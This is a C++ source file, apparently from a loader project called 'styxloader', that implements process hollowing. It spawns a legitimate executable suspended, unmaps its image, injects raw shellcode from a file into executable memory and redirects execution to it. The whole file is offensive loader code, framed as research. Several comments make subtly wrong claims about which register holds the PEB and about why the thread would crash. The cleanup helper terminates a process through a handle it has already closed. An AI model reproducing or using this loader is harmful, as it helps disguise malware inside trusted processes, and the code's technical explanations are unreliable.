#include "styxloader/hollow_injector.hpp"
#include "styxloader/shellcode.hpp"

#include <windows.h>
#include <iostream>

namespace styxloader {

// Helper: closes both handles + terminates the suspended process.
// Used by every error path to avoid handle leaks.
namespace {
void CleanupAndFail(PROCESS_INFORMATION& pi) {
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    TerminateProcess(pi.hProcess, 0);
}
}  // namespace

bool ProcessHollowing(const char* targetExe, const char* shellcodePath) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    // Step 1: Create the legitimate process in suspended state.
    // The suspended thread starts at ntdll!LdrInitializeThunk, which on
    // x64 receives the PEB pointer in rcx (Win64 calling convention).
    // We will read rcx via GetThreadContext to find the PEB.
    if (!CreateProcessA(targetExe, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cout << "Error creating suspended process (GetLastError="
                  << GetLastError() << ")." << std::endl;
        return false;
    }

    // Step 2: Read the shellcode payload from disk.
    // For raw shellcode (the only payload type currently supported by this
    // research framework), the entire file is the executable code; there
    // is no PE header to parse and no entry point to compute. The
    // allocation base will BE the entry point.
    auto shellcode = ReadShellcode(shellcodePath);
    if (shellcode.empty()) {
        std::cout << "Error reading shellcode (file empty or not found: "
                  << shellcodePath << ")." << std::endl;
        CleanupAndFail(pi);
        return false;
    }

    // Step 3: Get the suspended thread's context.
    // On x64, ctx.Rcx holds the PEB pointer (passed to LdrInitializeThunk).
    // The original code read ctx.Rdx, which is the second Win64 argument
    // register — wrong register, wrong value.
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cout << "Error getting thread context (GetLastError="
                  << GetLastError() << ")." << std::endl;
        CleanupAndFail(pi);
        return false;
    }

    // === Audit fix F10: read the image base via PEB.ImageBaseAddress ===
    // The PEB structure on x64 has ImageBaseAddress at offset 0x10.
    // Reference: Windows Internals 7th ed. Part 1, "PEB" section.
    // We ReadProcessMemory from (ctx.Rcx + 0x10) to get the actual
    // image base of the legitimate process we just spawned.
    PVOID imageBase = nullptr;
    SIZE_T dummy = 0;
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)((ULONG_PTR)ctx.Rcx + 0x10),
                           &imageBase, sizeof(PVOID), &dummy)) {
        std::cout << "Error reading PEB.ImageBaseAddress (GetLastError="
                  << GetLastError() << ")." << std::endl;
        CleanupAndFail(pi);
        return false;
    }
    if (!imageBase) {
        std::cout << "PEB.ImageBaseAddress is null — unexpected." << std::endl;
        CleanupAndFail(pi);
        return false;
    }

    // Step 4: Unmap the original image.
    // ZwUnmapViewOfSection releases the section backing the original image.
    // After this, the process has no executable image mapped — its address
    // space is empty until we allocate the new region in step 5.
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto ZwUnmapViewOfSection = (NTSTATUS(NTAPI*)(HANDLE, PVOID))
        GetProcAddress(hNtdll, "ZwUnmapViewOfSection");
    if (!ZwUnmapViewOfSection) {
        std::cout << "ZwUnmapViewOfSection not found in ntdll." << std::endl;
        CleanupAndFail(pi);
        return false;
    }
    NTSTATUS unmapStatus = ZwUnmapViewOfSection(pi.hProcess, imageBase);
    if (unmapStatus != 0) {
        std::cout << "Error unmapping memory (NTSTATUS=0x" << std::hex
                  << unmapStatus << ")." << std::endl;
        CleanupAndFail(pi);
        return false;
    }

    // Step 5: Allocate a new region in the target process.
    // We pass imageBase as the preferred address — the kernel will try to
    // honor it (giving us the same address as the original image, which
    // matters if the shellcode uses absolute addressing). If the address
    // is unavailable, VirtualAllocEx falls back to NULL (let the kernel
    // choose). For raw shellcode that uses RIP-relative addressing, the
    // specific address does not matter functionally.
    PVOID newBase = VirtualAllocEx(pi.hProcess, imageBase, shellcode.size(),
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!newBase) {
        // Retry without preferred address.
        newBase = VirtualAllocEx(pi.hProcess, nullptr, shellcode.size(),
                                 MEM_COMMIT | MEM_RESERVE,
                                 PAGE_EXECUTE_READWRITE);
    }
    if (!newBase) {
        std::cout << "Error allocating new memory (GetLastError="
                  << GetLastError() << ")." << std::endl;
        CleanupAndFail(pi);
        return false;
    }

    // Step 6: Write the shellcode.
    if (!WriteProcessMemory(pi.hProcess, newBase, shellcode.data(),
                            shellcode.size(), &dummy)) {
        std::cout << "Error writing shellcode (GetLastError="
                  << GetLastError() << ")." << std::endl;
        CleanupAndFail(pi);
        return false;
    }

    // === Audit fix F12: patch PEB.ImageBaseAddress ===
    // For a full PE payload, the loader (ntdll!LdrpInitializeProcess)
    // reads PEB.ImageBaseAddress to resolve imports and apply relocations.
    // Writing the new base here makes that work correctly. For raw
    // shellcode (our case), this patch is a no-op functionally but is
    // correct behavior and keeps the technique honest for future PE
    // payload support.
    if (!WriteProcessMemory(pi.hProcess,
                            (LPVOID)((ULONG_PTR)ctx.Rcx + 0x10),
                            &newBase, sizeof(PVOID), &dummy)) {
        std::cout << "Warning: failed to patch PEB.ImageBaseAddress "
                     "(GetLastError=" << GetLastError() << "). "
                     "Continuing — for raw shellcode this is non-fatal." << std::endl;
        // Non-fatal: continue with the original PEB value.
    }

    // === Audit fix F11: redirect execution via ctx.Rip, not ctx.Rcx ===
    // For raw shellcode, the allocation base IS the entry point (no PE
    // header to compute AddressOfEntryPoint from). For a full PE, we
    // would compute newBase + AddressOfEntryPoint here.
    //
    // The original code set ctx.Rcx = newBase, which is wrong: Rcx is a
    // general-purpose register, not the instruction pointer. The thread
    // resumes at its original Rip (ntdll!LdrInitializeThunk), which now
    // points to unmapped memory → access violation, process crash.
    ctx.Rip = (DWORD64)newBase;

    // Step 7: Set the modified context and resume the thread.
    if (!SetThreadContext(pi.hThread, &ctx)) {
        std::cout << "Error setting thread context (GetLastError="
                  << GetLastError() << ")." << std::endl;
        CleanupAndFail(pi);
        return false;
    }

    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        std::cout << "Error resuming thread (GetLastError="
                  << GetLastError() << ")." << std::endl;
        CleanupAndFail(pi);
        return false;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

}  // namespace styxloader
